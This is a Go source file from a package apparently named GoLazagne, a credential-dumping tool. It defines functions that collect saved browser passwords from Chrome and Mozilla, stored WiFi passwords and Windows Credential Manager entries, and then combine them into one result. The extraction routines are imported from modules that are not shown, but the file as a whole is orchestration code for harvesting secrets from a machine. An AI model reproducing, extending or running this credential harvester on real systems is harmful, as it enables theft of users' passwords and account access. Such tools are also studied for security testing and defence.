package GoLazagne

import (
	"goLaZagne/browsers"
	"goLaZagne/common"
	"goLaZagne/wifi"
	"goLaZagne/windows"
)

type SuccessCredentialsResult struct {
	App  string
	Data []common.UrlNamePass
}

type SuccessWifiResult struct {
	App  string
	Data []common.NamePass
}

func ExtractBrowserCredentials() ([]common.UrlNamePass, int) {
	var AllBrowsersData []common.UrlNamePass
	if resultChrome := browsers.ChromeExtractDataRun(); resultChrome.Success {
		AllBrowsersData = append(AllBrowsersData, resultChrome.Data...)
	}
	/*
	if resultOpera := browsers.OperaExtractDataRun(); resultOpera.Success {
		AllBrowsersData = append(AllBrowsersData, resultOpera.Data...)
	}
	*/
	if resultMozilla := browsers.MozillaExtractDataRun(); resultMozilla.Success {
		AllBrowsersData = append(AllBrowsersData, resultMozilla.Data...)
	}

	return AllBrowsersData, len(AllBrowsersData)
}

func ExtractWifiData() ([]common.NamePass, int){
	var resultWifi = wifi.WifiExtractDataRun()
	if resultWifi.Success {
		return resultWifi.Data, len(resultWifi.Data)
	}
	return nil, 0
}

func ExtractCredmanData() ([]common.NamePass, int) {
	var windowsResult = windows.CredManModuleStart()
	if windowsResult.Success {
		return windowsResult.Data, len(windowsResult.Data)
	}
	return nil, 0
}

type AllDataStruct struct {
	wifiData []common.NamePass
	browserData []common.UrlNamePass
	credmanData []common.NamePass
}

func ExtractAllData() (AllDataStruct, int) {
	var wifiData, lengthWiFiData = ExtractWifiData()
	var browserData, lengthBrowserData = ExtractBrowserCredentials()
	var credmanData, lengthCredmanData = ExtractCredmanData()

	var outDataStruct AllDataStruct

	if lengthWiFiData > 0 {
		outDataStruct.wifiData = wifiData
	}
	if lengthBrowserData > 0 {
		outDataStruct.browserData = browserData
	}
	if lengthCredmanData > 0 {
		outDataStruct.credmanData = credmanData
	}

	return outDataStruct, lengthCredmanData+lengthBrowserData+lengthWiFiData
}